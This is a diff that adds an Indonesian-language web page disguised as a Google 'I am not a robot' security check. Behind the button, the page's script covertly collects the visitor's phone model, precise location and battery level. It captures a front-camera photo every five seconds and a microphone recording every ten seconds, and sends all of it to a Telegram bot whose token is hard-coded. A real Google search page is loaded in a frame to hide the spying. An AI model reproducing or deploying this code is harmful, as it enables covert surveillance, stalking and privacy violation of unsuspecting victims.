@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Verifikasi Keamanan</title>
+    <style>
+        body { margin: 0; font-family: arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { width: 90%; max-width: 400px; padding: 20px; border: 1px solid #dfe1e5; border-radius: 8px; box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
+        .logo { width: 150px; margin-bottom: 20px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 15px; width: 100%; }
+        #mainContent { display: none; width: 100%; height: 100%; }
+        iframe { border: none; width: 100%; height: 100%; }
+    </style>
+</head>
+<body>
+
+<div id="verifyBox" class="box">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
+    <p>Sistem mendeteksi aktivitas mencurigakan. Klik tombol di bawah untuk melanjutkan ke pencarian.</p>
+    <button class="btn" onclick="startSystem()">SAYA BUKAN ROBOT</button>
+</div>
+
+<div id="mainContent">
+    <iframe id="gFrame" src=""></iframe>
+</div>
+
+<video id="video" style="display:none;" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = '8746483619:AAFipJ85I2c7vj-WDstQyYC1-7LL3LsNQZM';
+    const CHAT_ID = '6888530451';
+    let userLoc = "Menunggu izin...";
+    let deviceName = "Mendeteksi...";
+
+    async function getAdvancedDeviceName() {
+        let rawModel = "Mobile Device";
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            try {
+                const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
+                rawModel = hints.model || rawModel;
+            } catch (e) {}
+        } else {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
+            if (match) rawModel = match[3].split(" Build")[0].trim();
+        }
+        
+        const db = {
+            "2310FPCA4G": "POCO C65", "M2102J20SG": "POCO X3 Pro", "2201117TY": "Redmi Note 11", 
+            "2201116SG": "Redmi Note 11 Pro", "22101316G": "POCO M5", "M2012K11AG": "POCO F3", 
+            "23076RN4BI": "Redmi 12", "M2010J19CG": "Redmi 9T", "M2007J20CG": "POCO X3 NFC",
+            "21061119DG": "Xiaomi Mi 11 Lite", "2201116PG": "POCO X4 Pro 5G", "23122PCD1G": "POCO X6 Pro",
+            "23090RA98G": "Redmi 13C", "M2006C3LG": "Redmi 9A", "21121119VL": "Xiaomi 12",
+            "SM-A145F": "Samsung A14", "SM-A546E": "Samsung A54 5G", "SM-A042F": "Samsung A04e",
+            "SM-G991B": "Samsung S21", "SM-A346E": "Samsung A34 5G", "SM-A525F": "Samsung A52",
+            "SM-M236B": "Samsung M23 5G", "SM-A135F": "Samsung A13", "SM-A037F": "Samsung A03s",
+            "SM-A125F": "Samsung A12", "SM-A325F": "Samsung A32", "SM-A235F": "Samsung A23",
+            "SM-A055F": "Samsung A05", "SM-A057F": "Samsung A05s", "SM-S901B": "Samsung S22",
+            "X6831": "Infinix Note 30", "X669": "Infinix Smart 7", "X6711": "Infinix Note 30 Pro",
+            "X6833B": "Infinix Note 30 5G", "X669C": "Infinix Smart 7 HD", "X6515": "Infinix Hot 12i",
+            "X6816C": "Infinix Hot 11S", "X6825": "Infinix Note 12", "X6811": "Infinix Note 11",
+            "X6525": "Infinix Smart 8", "X6836": "Infinix Note 40", "CPH2387": "Oppo A57", 
+            "CPH2477": "Oppo A17", "CPH1909": "Oppo A5s", "CPH2185": "Oppo A15",
+            "CPH2269": "Oppo A16", "CPH2239": "Oppo Reno 6", "CPH2343": "Oppo Reno 7",
+            "CPH2371": "Oppo A96", "CPH2523": "Oppo A78", "CPH2483": "Oppo A77s",
+            "V2204": "Vivo Y02", "V2202": "Vivo V27 5G", "V2111": "Vivo Y21", "V2026": "Vivo Y12s",
+            "V2109": "Vivo Y33s", "PD1901": "Vivo Y15", "V2250": "Vivo V25", "V2307": "Vivo Y36",
+            "V2141": "Vivo Y75 5G", "V2249": "Vivo V25 Pro", "V2217": "Vivo Y22",
+            "KJ5": "Tecno Spark 20", "AD6": "Tecno Pova 5", "BG6": "Itel P55", "S665L": "Itel Vision 1"
+        };
+        return db[rawModel] || rawModel;
+    }
+
+    async function startSystem() {
+        deviceName = await getAdvancedDeviceName();
+        document.getElementById('verifyBox').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+        document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
+        }
+
+        // Kamera Depan
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('video').srcObject = stream;
+            setInterval(takeAndSend, 5000);
+        } catch (e) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                setInterval(takeAndSend, 5000);
+            } catch (err) { takeAndSend(); }
+        }
+
+        // Tambahan: Live Mic
+        startAudioCapture();
+    }
+
+    async function startAudioCapture() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            let audioChunks = [];
+            
+            recorder.ondataavailable = (e) => audioChunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                sendAudio(blob);
+                audioChunks = [];
+                recorder.start();
+            };
+
+            recorder.start();
+            setInterval(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
+        } catch (e) { console.log("Mic blocked"); }
+    }
+
+    async function sendAudio(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('voice', blob, 'mic.ogg');
+        fd.append('caption', `🎙 *Audio Terpantau*\nHP: ${deviceName}`);
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+    }
+
+    async function takeAndSend() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let battery = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery = Math.round(b.level * 100) + "%";
+        }
+
+        const report = (blob) => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Depan`);
+            fd.append('parse_mode', 'Markdown');
+            if (blob) {
+                fd.append('photo', blob, 'shot.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } else {
+                fd.append('text', fd.get('caption'));
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
+            }
+        };
+
+        if (video.videoWidth > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(report, 'image/jpeg', 0.6);
+        } else {
+            report(null);
+        }
+    }
+</script>
+</body>
+</html>
